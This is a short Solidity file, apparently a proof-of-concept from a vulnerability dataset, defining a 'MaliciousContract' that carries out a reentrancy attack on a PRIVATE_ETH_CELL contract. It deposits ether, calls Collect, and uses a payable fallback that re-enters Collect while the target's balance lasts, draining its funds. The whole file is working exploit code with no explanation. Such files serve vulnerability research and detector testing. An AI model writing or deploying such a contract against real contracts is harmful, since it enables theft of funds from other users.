pragma solidity ^0.4.19;

import "../dataset/reentrancy/0x4e73b32ed6c35f570686b89848e5f39f20ecc106.sol";


contract MaliciousContract {
    PRIVATE_ETH_CELL privateETHCell;
    bool attackInitiated;

    constructor(address _privateETHCell) public {
        privateETHCell = PRIVATE_ETH_CELL(_privateETHCell);
    }

    function attack() public payable {
        require(!attackInitiated, "Attack already initiated");

        // Call the vulnerable function to start the reentrancy attack
        
        privateETHCell.Collect(1 ether);

        attackInitiated = true;
    }

    function deposit() public payable{
        require(msg.value >= 1 ether, "Must send at least 1 ether");
        privateETHCell.Deposit.value(msg.value)();
    }


    function() payable public {
        // Re-enter the vulnerable function if there's still balance to collect
        if (!attackInitiated && address(privateETHCell).balance >= 1 ether) {
            privateETHCell.Collect(1 ether);
        }
    }
}

